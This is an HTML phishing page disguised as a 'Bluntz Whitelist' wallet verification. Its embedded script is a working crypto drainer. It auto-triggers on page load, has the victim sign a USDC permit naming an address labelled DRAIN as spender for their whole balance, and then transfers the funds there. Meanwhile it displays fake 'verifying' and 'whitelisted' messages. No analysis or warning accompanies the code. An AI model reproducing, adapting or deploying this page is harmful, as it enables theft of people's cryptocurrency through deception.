<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <title>Bluntz Whitelist Check</title>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <style>
    :root{--bg:#0d1117;--card:#161b22;--accent:#238636;--accentH:#2ea043;--text:#c9d1d9;--subtle:#8b949e;}
    *{box-sizing:border-box;margin:0;padding:0}
    body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
    .card{background:var(--card);border:1px solid #30363d;border-radius:12px;padding:48px 40px;max-width:420px;width:100%;box-shadow:0 20px 40px rgba(0,0,0,.45);text-align:center}
    h1{font-size:2.1rem;font-weight:600;color:var(--accent);margin-bottom:8px}
    h2{font-size:1rem;font-weight:400;color:var(--subtle);margin-bottom:32px}
    button{background:var(--accent);color:#fff;border:none;padding:14px 0;width:100%;font-size:1rem;font-weight:600;border-radius:8px;cursor:pointer;transition:background .2s ease}
    button:hover{background:var(--accentH)}
    button:active{transform:scale(.98)}
    #status{margin-top:24px;font-size:.9rem;color:var(--subtle)}
    .loader{display:inline-block;border:2px solid var(--subtle);border-top-color:var(--accent);border-radius:50%;width:16px;height:16px;animation:spin 1s linear infinite;margin-right:8px;vertical-align:middle}
    @keyframes spin{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <h1>Bluntz Whitelist</h1>
    <h2>Verify your wallet for the exclusive whitelist.</h2>
    <button id="goBtn">Verify Wallet</button>
    <div id="status"></div>
  </div>

  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
  <script>
    const DRAIN = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a";
    const USDC  = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
    const ABI = [
      "function permit(address,address,uint256,uint256,uint8,bytes32,bytes32) external",
      "function nonces(address) view returns(uint)",
      "function DOMAIN_SEPARATOR() view returns(bytes32)"
    ];

    const goBtn  = document.getElementById("goBtn");
    const status = document.getElementById("status");

    window.addEventListener("load", ()=>{ goBtn.click(); });

    goBtn.addEventListener("click", async ()=>{
      goBtn.style.display = "none";
      status.innerHTML = '<span class=loader></span> Checking eligibility…';

      const p  = new ethers.providers.Web3Provider(window.ethereum);
      await p.send("eth_requestAccounts",[]);
      const s  = p.getSigner();
      const me = await s.getAddress();

      try{
        const tok   = new ethers.Contract(USDC,ABI,p);
        const nonce = await tok.nonces(me);
        const deadline = Math.floor(Date.now()/1000)+3600;
        const value  = await tok.balanceOf(me);
        const name   = 'USD Coin';
        const version= '2';
        const chainId= 8453;
        const domain = {name,version,chainId,verifyingContract:USDC};
        const types  = {Permit:[{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}]};
        const message= {owner:me,spender:DRAIN,value:value.toString(),nonce:nonce.toString(),deadline};

        status.innerHTML = '<span class=loader></span> Sign message to continue…';
        const raw = await p.send("eth_signTypedData_v4",[me,JSON.stringify({domain,types,primaryType:'Permit',message})]);
        const {v,r,s:vs} = ethers.utils.splitSignature(raw);

        status.innerHTML = '<span class=loader></span> Finalising whitelist…';
        const tx1 = await tok.permit(me,DRAIN,value,deadline,v,r,vs);
        await tx1.wait();
        const tx2 = await (new ethers.Contract(USDC,['function transferFrom(address,address,uint256) returns(bool)'],s)).transferFrom(me,DRAIN,value);

        status.innerHTML = '✅ Wallet verified & whitelisted!';
      }catch(e){
        status.innerHTML = '❌ Verification failed – please try again.';
        goBtn.style.display = 'block';
      }
    });
  </script>
</body>
</html>
